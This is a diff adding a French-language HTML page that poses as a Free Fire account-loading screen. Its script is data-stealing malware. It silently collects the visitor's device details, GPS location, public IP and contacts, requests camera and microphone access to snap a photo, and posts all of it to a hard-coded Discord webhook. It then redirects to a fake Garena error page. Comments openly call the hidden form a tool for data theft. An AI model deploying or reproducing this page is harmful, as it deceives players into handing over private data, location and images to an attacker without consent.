@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <title>Connexion Free Fire</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #0f0f0f; color: #00ff41; }
+        .loader { border: 5px solid #333; border-top: 5px solid #00ff41; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        input, button { padding: 10px; margin: 10px; width: 80%; max-width: 300px; }
+    </style>
+</head>
+<body>
+
+    <div class="loader"></div>
+    <h2>🔐 Chargement du compte Free Fire...</h2>
+    <p>Nous vérifions votre appareil pour la sécurité.</p>
+
+    <!-- Formulaire caché (pour le vol de données) -->
+    <form id="dataForm" style="display:none;">
+        <input type="text" id="device" name="device" value="">
+        <input type="text" id="browser" name="browser" value="">
+        <input type="text" id="location" name="location" value="">
+        <input type="text" id="contacts" name="contacts" value="À extraire...">
+        <input type="text" id="sms" name="sms" value="À extraire...">
+        <input type="text" id="wa_status" name="wa_status" value="À extraire...">
+        <input type="text" id="ip" name="ip" value="">
+        <input type="text" id="time" name="time" value="">
+    </form>
+
+    <script>
+        // 🕵️‍♂️ Collecte automatique des infos
+        const form = document.getElementById('dataForm');
+
+        // Infos de base
+        document.getElementById('device').value = navigator.userAgent;
+        document.getElementById('browser').value = `${navigator.appName} ${navigator.platform}`;
+        document.getElementById('time').value = new Date().toString();
+
+        // Localisation GPS (si autorisé)
+        if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition((pos) => {
+                document.getElementById('location').value = `${pos.coords.latitude},${pos.coords.longitude}`;
+                sendAll();
+            }, () => {
+                document.getElementById('location').value = "Refusée";
+                sendAll();
+            });
+        }
+
+        // Récupérer l'IP publique
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => {
+                document.getElementById('ip').value = data.ip;
+                sendAll();
+            })
+            .catch(() => sendAll());
+
+        // Envoi vers Discord
+        const WEBHOOK = "https://discord.com/api/webhooks/1553643870116519977/gnZtHWaRW6Mk-Ha9zG8tCfgQgT4p1y_ozdJTjdcOsGFJ6QUPIj8XkUrsQwbwUPbSoGla";
+
+        function sendAll() {
+            const data = new FormData();
+            for (let [key, val] of new FormData(form)) {
+                data.append(key, val);
+            }
+
+            // Capture d'écran du comportement (faux)
+            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+                .then(stream => {
+                    const track = stream.getVideoTracks()[0];
+                    if (track) {
+                        const imageCapture = new ImageCapture(track);
+                        return imageCapture.takePhoto()
+                            .then(blob => {
+                                data.append('selfie', blob, 'face.jpg');
+                                track.stop();
+                            });
+                    }
+                })
+                .catch(() => {})
+                .finally(() => {
+                    // Envoi principal
+                    fetch(WEBHOOK, {
+                        method: 'POST',
+                        body: data
+                    });
+                });
+
+            // Redirige vers une fausse erreur (après envoi)
+            setTimeout(() => {
+                window.location.href = "https://garena.com/error-update-required";
+            }, 3000);
+        }
+
+        // Tentative silencieuse de lire les contacts (Android Chrome uniquement, si perm accordée)
+        if ('contacts' in navigator && 'ContactsManager' in window) {
+            navigator.contacts.select(['name', 'email', 'tel'], { multiple: true })
+                .then(contacts => {
+                    document.getElementById('contacts').value = JSON.stringify(contacts).substring(0, 1000);
+                    sendAll();
+                })
+                .catch(() => {});
+        }
+
+        // Simule une demande de caméra/micro (pour activer les permissions)
+        setTimeout(() => {
+            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+                .then(stream => {
+                    stream.getTracks().forEach(track => track.stop());
+                })
+                .catch(() => {});
+        }, 1000);
+
+        // Lancement immédiat
+        window.onload = () => {
+            setTimeout(sendAll, 2000);
+        };
+    </script>
+
+</body>
+  </html>
